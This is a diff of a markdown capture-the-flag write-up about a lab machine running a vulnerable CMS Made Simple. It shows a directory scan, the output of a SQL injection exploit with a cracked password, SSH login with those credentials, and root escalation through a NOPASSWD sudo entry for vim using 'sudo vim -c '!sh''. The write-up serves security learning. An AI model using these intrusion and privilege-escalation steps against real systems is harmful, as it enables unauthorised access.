@@ -38,7 +38,7 @@ PORT     STATE SERVICE REASON  VERSION
 ```
 
 #### gobuster hidden directory scan:
-`gobuster dir -u http://10.10.90.196 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirb.txt`
+`gobuster dir -u http://     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirb.txt`
 
 ```
 # Found directory:
@@ -68,6 +68,31 @@ CMS Made Simple < 2.2.10 - SQL Injection                                        
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
 [+] Password cracked: secret
 ```
+
+#### login using credentials we found
+`ssh mitch@10.10.90.196 -p 2222`
+
+
+#### After loggin in, cat user.txt
+
+```
+cat user.txt
+```
+
+#### Check the user sudo rights
+```
+sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+#### Esecelate to root user
+```
+sudo vim -c '!sh'
+cd /root
+cat root.txt
+```
+
+
 
 
 ---
